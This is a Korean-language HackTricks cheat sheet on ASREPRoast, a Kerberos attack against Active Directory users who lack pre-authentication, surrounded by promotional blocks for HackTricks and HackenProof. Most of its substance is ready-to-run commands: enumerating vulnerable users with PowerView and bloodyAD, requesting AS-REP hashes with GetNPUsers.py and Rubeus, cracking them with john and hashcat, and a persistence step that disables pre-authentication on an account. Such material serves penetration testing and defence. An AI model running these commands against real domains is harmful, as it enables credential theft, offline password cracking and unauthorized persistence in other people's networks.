# ASREPRoast

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking Tricks를 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험있는 해커와 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!

**해킹 인사이트**\
해킹의 스릴과 도전에 대해 자세히 알아보는 콘텐츠와 상호작용하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 최신 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!**

## ASREPRoast

ASREPRoast는 **Kerberos 사전 인증이 필요한 속성**이 없는 사용자를 악용하는 보안 공격입니다. 이 취약점은 공격자가 사용자의 비밀번호를 필요로하지 않고 도메인 컨트롤러(DC)로부터 사용자의 인증을 요청할 수 있게 합니다. 그럼 DC는 사용자의 비밀번호에서 유도된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인으로 크랙하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.

이 공격의 주요 요구 사항은 다음과 같습니다:
- **Kerberos 사전 인증의 부재**: 대상 사용자는 이 보안 기능이 활성화되어 있지 않아야 합니다.
- **도메인 컨트롤러(DC)에 대한 연결**: 공격자는 요청을 보내고 암호화된 메시지를 받기 위해 DC에 액세스해야 합니다.
- **옵션 도메인 계정**: 도메인 계정이 있는 경우 공격자는 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 이와 같은 계정이 없는 경우 공격자는 사용자 이름을 추측해야 합니다.


#### 취약한 사용자 열거 (도메인 자격 증명 필요)

{% code title="Windows 사용" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="리눅스 사용" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### AS_REP 메시지 요청

{% code title="리눅스 사용" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Windows를 사용하는 방법" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus를 사용한 AS-REP Roasting은 암호화 유형이 0x17이고 사전 인증 유형이 0인 4768을 생성합니다.
{% endhint %}

### 크래킹
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 지속성

**GenericAll** 권한 (또는 속성을 쓸 수 있는 권한)을 가진 사용자의 경우 **preauth**를 강제로 필요하지 않도록 설정:

{% code title="Windows 사용" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="리눅스 사용" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## 참고 자료

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커와 버그 바운티 헌터와 소통하려면 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하세요!

**해킹 통찰력**\
해킹의 스릴과 도전에 대해 자세히 알아보는 콘텐츠에 참여하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 최신 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**에 가입하여 최고의 해커들과 협업을 시작하세요!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**로 AWS 해킹을 처음부터 전문가까지 배워보세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
